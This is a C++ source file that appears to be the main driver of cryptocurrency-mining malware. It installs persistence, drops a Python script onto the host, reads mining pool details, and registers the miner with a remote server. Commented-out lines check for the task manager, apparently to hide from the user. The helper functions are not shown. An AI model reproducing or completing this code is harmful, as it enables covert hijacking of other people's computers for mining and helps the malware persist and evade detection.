// #include "communication.h"
// #include "tasks.h"
#include <iostream>
#include <string>
#include "base64.h"
#include "error.h"
#include "utils.h"

// IF NO INTERNET CONNECTION -> HARDCODED MINING INFO -> POOL ID
// CHANGE PERMISSION BITS TO CREATE DIRECTORY 

int main(int argc, char * argv[]){

    std::cout << "Running persistence ... " << std::endl;
    install_persistence();
    
    std::cout << "Dropping python script on machine" << std::endl;
    drop_python_script();

    std::cout << "Getting pool information ..." << std::endl;
    pool_info * pool = get_pool_info();
    std::cout << "Mining POOL: {id} = "<< pool->id << " {pool} = " << pool->pool << std::endl;
    
    std::cout << "Sending to server the miner ID ..." << std::endl;
    new_miner();

    

    // std::cout << "Starting thread to mine ..." << std::endl;
    // std::thread multithreading(Tasks::check_task_manager); // thread creation
    // Tasks::check_task_manager();
    // if(Tasks::lock_task_manager){
    //     std::cout << "true" << std::endl;
    // }else{
    //     std::cout << "false" << std::endl;
    // }

    // // desalocate memory
    // free(pool->id);
    // free(pool->pool);
    // free(pool);
    
}